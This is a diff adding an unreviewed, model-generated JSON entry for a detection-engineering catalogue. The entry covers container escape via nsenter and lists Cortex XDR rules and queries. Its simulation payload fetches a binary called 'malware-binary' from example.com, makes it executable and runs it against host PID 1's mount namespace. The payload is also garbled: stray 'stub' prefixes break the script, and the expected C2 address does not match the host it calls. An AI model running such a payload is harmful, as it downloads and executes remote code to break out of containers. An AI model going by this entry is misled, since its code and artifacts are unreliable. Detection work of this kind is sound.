@@ -1,0 +1,152 @@
+{
+  "id": "TTP-0000-0035",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Privileged Container Escape via nsenter to Host Namespaces",
+    "summary": "An attacker executes nsenter with target 1 to enter the host's mount namespace, enabling container escape. Cortex should detect this behavior via process start telemetry and behavioral analytics.",
+    "description": "An attacker executes nsenter with target 1 to enter the host's mount namespace, enabling container escape. Cortex should detect this behavior via process start telemetry and behavioral analytics."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1611",
+        "name": "Escape to Host",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/nsenter https://example.com/malware-binary\nstub chmod +x /tmp/nsenter\nstub /tmp/nsenter --target 1 --mount\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "nsenter process execution with --target 1 flag",
+        "expected_value": "action_process_image_name = 'nsenter' and actor_process_image_name = 'containerd'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "C2 connection to TEST-NET-1",
+        "expected_value": "action_remote_ip in ('192.0.2.1', '192.0.2.2')"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "K8s Privileged nsenter Escape",
+        "description": "Detection of nsenter process launched with --target 1 inside a privileged container",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'nsenter'\n| filter actor_process_image_name = 'containerd'\n| filter action_command_line contains '--target 1'\n| filter action_process_image_path = '/usr/bin/nsenter'",
+        "mitre_technique_ids": [
+          "T1611"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Kubernetes nsenter container escape",
+        "description": "Behavioral deviation modeled by ML detecting nsenter --target 1 in container context",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'nsenter'\n| filter action_command_line contains '--target 1'\n| filter actor_process_image_name = 'containerd'\n| filter causality_actor_process_image_name = 'kubelet'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "containerd process launching nsenter with host namespace access",
+        "mitre_technique_ids": [
+          "T1611"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect nsenter with --target 1 in container",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'nsenter'\n| filter action_command_line contains '--target 1'\n| filter actor_process_image_name = 'containerd'\n| fields agent_hostname, action_process_image_name, action_command_line, actor_process_image_name",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Kubernetes nsenter container escape; Required Data: XDR Agent; ATT&CK T1611. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Kubernetes nsenter container escape",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/kubernetes-nsenter-container-escape",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1611",
+      "url": "https://attack.mitre.org/techniques/T1611/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
